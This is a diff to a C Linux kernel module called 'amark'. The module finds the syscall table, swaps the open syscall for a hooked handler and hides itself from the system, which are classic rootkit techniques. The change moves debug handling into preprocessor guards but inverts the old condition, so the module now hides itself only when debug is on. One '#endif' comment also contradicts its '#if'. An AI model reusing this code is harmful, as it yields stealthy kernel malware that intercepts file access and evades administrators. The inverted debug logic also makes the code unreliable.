@@ -5,7 +5,7 @@
 
 MODULE_LICENSE("GPL");
 
-#define __DEBUG__ (true)
+#define __DEBUG__ (1)
 
 typedef void (*sys_call_ptr_t)(void);
 typedef asmlinkage long (*orig_open_t)(const char __user *filename, int flags, int mode);
@@ -43,11 +43,13 @@ asmlinkage long hooked_open(const char __user *filename, int flags, int mode) {
     return ret;
 }
 
+#if __DEBUG__
 static void timer_callback(unsigned long data)
 {
 	printk( "timer_callback: put orig_sys_open in syscall table.\n");
 	_sys_call_table[__NR_open] = orig_open;
 }
+#endif /* !__DEBUG__ */
 
 static void get_sys_call_table(void) {
     gate_desc *idt_table;
@@ -89,7 +91,9 @@ static void hide_amark(void) {
 }
 
 static int __init amark_init(void) {
+#if __DEBUG__
     int timeout_ms = 10000;
+#endif
 
     printk("+ amark loaded\n");
 
@@ -100,8 +104,9 @@ static int __init amark_init(void) {
         return 0;
     }
 
-    if (!__DEBUG__)
+#if __DEBUG__
       hide_amark();
+#endif
 
     orig_open = (orig_open_t) _sys_call_table[__NR_open];
 
@@ -117,9 +122,11 @@ static int __init amark_init(void) {
 
     printk("+ open hooked!\n");
 
+#if __DEBUG__
     setup_timer(&my_timer, timer_callback, 0);
     printk("+ starting timer the hijacked syscall by the real one in %dms (%ld)\n", timeout_ms, jiffies);
     mod_timer(&my_timer, jiffies + msecs_to_jiffies(timeout_ms));
+#endif /* !__DEBUG__ */
 
     return 0;
 }
